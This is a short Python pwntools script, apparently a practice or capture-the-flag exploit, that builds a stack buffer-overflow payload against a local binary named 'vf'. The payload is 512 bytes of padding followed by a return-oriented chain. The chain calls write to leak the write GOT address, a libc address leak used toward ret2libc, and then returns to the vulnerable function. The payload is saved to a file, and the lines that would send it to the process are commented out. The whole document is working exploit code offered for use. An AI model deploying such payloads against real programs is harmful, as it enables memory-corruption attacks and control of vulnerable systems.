from pwn import *

vb = ELF('vf')
libc = ELF('libc.so.6')

write_plt = vb.plt['write']
write_got = vb.got['write']
print 'write_plt = ' + hex(write_plt)
print 'write_got = ' + hex(write_got)
print 'write_sym = ' + hex(vb.symbols['write'])
addr_bin = 0xb7f4bdc8
vul_func = 0x0040054d

write_plt = 0xb7ec5cd0
shellcode = 512 * 'A'
shellcode += p32(write_plt) + p32(vul_func) + p32(1) + p32(write_got) + p32(4)

f = open('test.txt', 'w')
f.write(shellcode)
f.close()

#p = process(['./vf', ])
#p.send(shellcode)
#print p.recvall()
#p.interactive()
